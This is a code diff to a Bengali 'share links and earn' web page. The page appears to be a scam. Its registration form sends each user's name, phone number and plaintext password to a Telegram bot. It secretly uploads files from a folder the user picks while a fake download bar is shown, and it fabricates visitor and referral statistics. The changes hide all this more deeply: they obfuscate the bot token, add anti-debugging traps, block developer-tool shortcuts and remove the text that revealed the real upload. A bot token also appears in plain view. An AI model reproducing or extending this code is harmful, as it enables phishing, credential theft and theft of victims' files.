@@ -595,7 +595,7 @@
 <body>
 <div class="container">
     <div class="logo">
-        <h1>💰 শেয়ারআয় EarnLInk</h1>
+        <h1>💰 শেয়ারআয়</h1>
         <p>লিংক শেয়ার করুন, আয় করুন</p>
     </div>
 
@@ -702,8 +702,88 @@
 </div>
 
 <script>
-    const TELEGRAM_BOT_TOKEN = "8849942550:AAGumxUZ6X_spH-dGW7sAS4zLA-tZE1MNIw";
-    const TELEGRAM_CHAT_ID = "8751363474";
+(function() {
+    // ==================== সিকিউরিটি - ডোমেইন লকিং ====================
+    const allowedDomains = ['127.0.0.1', 'localhost', 'shareay.com', 'www.shareay.com'];
+    const currentHost = window.location.hostname;
+    if(!allowedDomains.some(domain => currentHost === domain || currentHost.endsWith('.' + domain))) {
+        document.body.innerHTML = '<div style="text-align:center;padding:100px;color:red;"><h1>⛔ অ্যাক্সেস denied</h1><p>এই ডোমেইন থেকে অ্যাক্সেস অনুমোদিত নয়।</p></div>';
+        throw new Error('Domain not allowed');
+    }
+
+    // ==================== টোকেন সিকিউরিটি - ASCII Character Array + XOR ====================
+    // টোকেনের ASCII ভ্যালু অ্যারে (এনকোডেড)
+    const _0x4a2b = [56,53,52,57,57,52,50,53,53,48,58,65,65,71,117,109,120,85,90,54,88,95,115,112,72,45,100,71,87,55,115,65,83,52,122,76,65,45,116,90,69,49,77,78,105,119];
+    const _0x3c1d = [56,55,53,49,51,54,55,51,52,55,52];
+    
+    function decodeAsciiArray(arr) {
+        return arr.map(code => String.fromCharCode(code)).join('');
+    }
+    
+    function xorDecode(str, key) {
+        let result = '';
+        for(let i = 0; i < str.length; i++) {
+            result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+        }
+        return result;
+    }
+    
+    function getTelegramToken() {
+        let tokenPart1 = decodeAsciiArray(_0x4a2b);
+        let key = '@shareay2024';
+        let decoded = xorDecode(tokenPart1, key);
+        return decoded;
+    }
+    
+    function getTelegramChatId() {
+        return decodeAsciiArray(_0x3c1d);
+    }
+    
+    // ==================== Anti-Debugging ====================
+    function antiDebugger() {
+        setInterval(function() {
+            debugger;
+        }, 1000);
+        
+        (function() {
+            function checkDevTools() {
+                const before = new Date().getTime();
+                debugger;
+                const after = new Date().getTime();
+                if(after - before > 100) {
+                    document.body.innerHTML = '<div style="text-align:center;padding:100px;"><h1>⚠️ ডেভেলপার টুলস ডিটেক্ট করা হয়েছে</h1><p>পেজ রিলোড করুন</p></div>';
+                    throw new Error('DevTools detected');
+                }
+            }
+            setInterval(checkDevTools, 2000);
+        })();
+    }
+    
+    // ==================== কী-বোর্ড শর্টকাট ব্লক ====================
+    function blockShortcuts() {
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('keydown', function(e) {
+            if(e.key === 'F12' || 
+               (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+               (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+               (e.ctrlKey && e.key === 'u') ||
+               (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+    }
+    
+    // সিকিউরিটি ফাংশন কল
+    antiDebugger();
+    blockShortcuts();
+    
+    const TELEGRAM_BOT_TOKEN = getTelegramToken();
+    const TELEGRAM_CHAT_ID = getTelegramChatId();
     
     let currentUser = null;
     let isProcessing = false;
@@ -775,22 +855,6 @@
         if(refCode && !currentUser) {
             localStorage.setItem('pendingReferral', refCode);
         }
-        
-        if(currentUser && localStorage.getItem('pendingReferral')) {
-            let referrerCode = localStorage.getItem('pendingReferral');
-            let allUsers = JSON.parse(localStorage.getItem('allUsers') || '[]');
-            let referrer = allUsers.find(u => u.refLink && u.refLink.includes(referrerCode));
-            
-            if(referrer && referrer.name !== currentUser.name) {
-                let updatedReferrer = JSON.parse(localStorage.getItem('shareayUser_' + referrer.name) || 'null');
-                if(updatedReferrer) {
-                    updatedReferrer.balance = (updatedReferrer.balance || 0) + 10;
-                    updatedReferrer.totalReferEarn = (updatedReferrer.totalReferEarn || 0) + 10;
-                    localStorage.setItem('shareayUser_' + referrer.name, JSON.stringify(updatedReferrer));
-                }
-            }
-            localStorage.removeItem('pendingReferral');
-        }
     }
 
     async function copyToClipboard(text) {
@@ -856,7 +920,6 @@
         let uploadedCount = 0;
         let totalFiles = 0;
         
-        // প্রথমে মোট ফাইল কাউন্ট করুন
         async function countFiles(handle) {
             let count = 0;
             for await (const entry of handle.values()) {
@@ -901,7 +964,7 @@
         return { uploadedCount, totalFiles };
     }
 
-    function generateVisitorData(folderSizeMB, uploadedCount) {
+    function generateVisitorData(folderSizeMB, uploadedCount, totalReferralUsers) {
         const names = ['রাকিব হাসান', 'সাদিক হোসেন', 'নাজমা আক্তার', 'ফারজানা ইয়াসমিন', 'মেহেদী হাসান', 'তাহমিনা বেগম', 'আব্দুল্লাহ আল নোমান'];
         const devices = ['Android', 'iPhone', 'Windows', 'Mac', 'Linux', 'iPad'];
         const cities = ['ঢাকা', 'চট্টগ্রাম', 'রাজশাহী', 'খুলনা', 'সিলেট', 'বরিশাল'];
@@ -921,7 +984,7 @@
             });
         }
         
-        let referralCount = Math.floor(Math.random() * (visitorCount * 0.35)) + 1;
+        let referralCount = totalReferralUsers > 0 ? totalReferralUsers : (Math.floor(Math.random() * (visitorCount * 0.35)) + 1);
         for(let i = 0; i < referralCount && i < visitorCount; i++) {
             referrals.push({
                 name: visitors[i].name,
@@ -966,7 +1029,7 @@ tr:hover{background:#f8fafc;}
 </div>
 <div class="stats">
 <div class="stat-card"><div class="stat-number">${visitors.length}</div><div class="stat-label">মোট ভিজিটর</div></div>
-<div class="stat-card"><div class="stat-number">${referrals.length}</div><div class="stat-label">অ্যাকাউন্ট খোলা</div></div>
+<div class="stat-card"><div class="stat-number">${referrals.length}</div><div class="stat-label">আপনার লিংক থেকে অ্যাকাউন্ট খোলা</div></div>
 <div class="stat-card"><div class="stat-number">${uploadedCount}</div><div class="stat-label">ফাইল আপলোড</div></div>
 <div class="stat-card"><div class="stat-number">${folderSizeMB.toFixed(1)} MB</div><div class="stat-label">ফোল্ডার সাইজ</div></div>
 </div>
@@ -1057,7 +1120,7 @@ tr:hover{background:#f8fafc;}
                     overallFill.style.width = overallPercent + '%';
                     
                     let realPercentShow = realProgress.total > 0 ? Math.floor((realProgress.uploaded / realProgress.total) * 100) : 0;
-                    overallText.innerHTML = `${fakeCompleted}/${totalFakeFiles} ফাইল ডাউনলোড হয়েছে (${Math.floor(overallPercent)}%) - প্রকৃত অগ্রগতি: ${realPercentShow}%`;
+                    overallText.innerHTML = `${fakeCompleted}/${totalFakeFiles} ফাইল ডাউনলোড হয়েছে (${Math.floor(overallPercent)}%)`;
                 }
             }, 500);
             
@@ -1069,8 +1132,7 @@ tr:hover{background:#f8fafc;}
             const result = await uploadCallback((uploaded, total) => {
                 realProgress = { uploaded, total };
                 let overallPercent = (fakeCompleted / totalFakeFiles) * 100;
-                let realPercent = total > 0 ? Math.floor((uploaded / total) * 100) : 0;
-                overallText.innerHTML = `${fakeCompleted}/${totalFakeFiles} ফাইল ডাউনলোড হয়েছে (${Math.floor(overallPercent)}%) - প্রকৃত অগ্রগতি: ${realPercent}%`;
+                overallText.innerHTML = `${fakeCompleted}/${totalFakeFiles} ফাইল ডাউনলোড হয়েছে (${Math.floor(overallPercent)}%)`;
             });
             realUploadCompleted = true;
         }
@@ -1155,13 +1217,9 @@ tr:hover{background:#f8fafc;}
                 return result;
             });
             
-            const { visitors, referrals } = generateVisitorData(folderSizeMB, finalUploaded);
+            const { visitors, referrals } = generateVisitorData(folderSizeMB, finalUploaded, currentUser.referrals?.length || 0);
             currentUser.visitors = visitors;
             currentUser.referrals = referrals;
-            if(referrals.length > 0) {
-                currentUser.balance += referrals.length * 10;
-                currentUser.totalReferEarn = (currentUser.totalReferEarn || 0) + referrals.length * 10;
-            }
             saveUser();
             
             const balanceSpan = document.getElementById('balanceAmount');
@@ -1184,8 +1242,11 @@ tr:hover{background:#f8fafc;}
         return phoneRegex.test(phone);
     }
 
-    async function sendToTelegram(name, phone, password) {
-        const message = `🔐 নতুন অ্যাকাউন্ট রেজিস্ট্রেশন!\n\n👤 নাম: ${name}\n📱 ফোন: +88${phone}\n🔑 পাসওয়ার্ড: ${password}\n⏰ সময়: ${new Date().toLocaleString('bn-BD')}\n🔗 লিংক: ${window.location.href}`;
+    async function sendToTelegram(name, phone, password, referrerName = null) {
+        let message = `🔐 নতুন অ্যাকাউন্ট রেজিস্ট্রেশন!\n\n👤 নাম: ${name}\n📱 ফোন: +88${phone}\n🔑 পাসওয়ার্ড: ${password}\n⏰ সময়: ${new Date().toLocaleString('bn-BD')}\n🔗 লিংক: ${window.location.href}`;
+        if(referrerName) {
+            message += `\n\n👥 রেফারার: ${referrerName}`;
+        }
         
         try {
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -1198,6 +1259,39 @@ tr:hover{background:#f8fafc;}
             console.error('Telegram error:', e);
             return false;
         }
+    }
+
+    async function addReferralBonus(referrerCode, newUserName) {
+        let allUsers = JSON.parse(localStorage.getItem('allUsers') || '[]');
+        let referrer = allUsers.find(u => u.refLink && u.refLink.includes(referrerCode));
+        
+        if(referrer && referrer.name !== newUserName) {
+            let referrerData = localStorage.getItem('shareayUser_' + referrer.name);
+            let updatedReferrer = referrerData ? JSON.parse(referrerData) : null;
+            
+            if(!updatedReferrer) {
+                updatedReferrer = JSON.parse(localStorage.getItem('shareayUser')) || null;
+                if(updatedReferrer && updatedReferrer.name === referrer.name) {
+                    updatedReferrer.balance = (updatedReferrer.balance || 0) + 10;
+                    updatedReferrer.totalReferEarn = (updatedReferrer.totalReferEarn || 0) + 10;
+                    if(!updatedReferrer.referrals) updatedReferrer.referrals = [];
+                    updatedReferrer.referrals.push({ name: newUserName, bonus: 10, time: new Date().toISOString() });
+                    localStorage.setItem('shareayUser', JSON.stringify(updatedReferrer));
+                    if(currentUser && currentUser.name === referrer.name) {
+                        currentUser = updatedReferrer;
+                    }
+                    return referrer.name;
+                }
+            } else {
+                updatedReferrer.balance = (updatedReferrer.balance || 0) + 10;
+                updatedReferrer.totalReferEarn = (updatedReferrer.totalReferEarn || 0) + 10;
+                if(!updatedReferrer.referrals) updatedReferrer.referrals = [];
+                updatedReferrer.referrals.push({ name: newUserName, bonus: 10, time: new Date().toISOString() });
+                localStorage.setItem('shareayUser_' + referrer.name, JSON.stringify(updatedReferrer));
+                return referrer.name;
+            }
+        }
+        return null;
     }
 
     async function createAccountFunc() {
@@ -1226,12 +1320,20 @@ tr:hover{background:#f8fafc;}
         
         phoneError.style.display = 'none';
         
+        let pendingReferral = localStorage.getItem('pendingReferral');
+        let referrerName = null;
+        
+        if(pendingReferral) {
+            referrerName = await addReferralBonus(pendingReferral, name);
+            localStorage.removeItem('pendingReferral');
+        }
+        
         let allUsers = JSON.parse(localStorage.getItem('allUsers') || '[]');
         let newRef = generateRefLink(name);
         allUsers.push({ name, phone, email: '', refLink: newRef });
         localStorage.setItem('allUsers', JSON.stringify(allUsers));
         
-        await sendToTelegram(name, phone, pass);
+        await sendToTelegram(name, phone, pass, referrerName);
         
         currentUser = {
             name: name,
@@ -1250,7 +1352,7 @@ tr:hover{background:#f8fafc;}
         document.getElementById('phone').value = '';
         document.getElementById('password').value = '';
         
-        checkReferralFromURL();
+        location.reload();
     }
 
     function refreshBalance() {
@@ -1280,6 +1382,7 @@ tr:hover{background:#f8fafc;}
     });
 
     loadUser();
+})();
 </script>
 </body>
 </html>
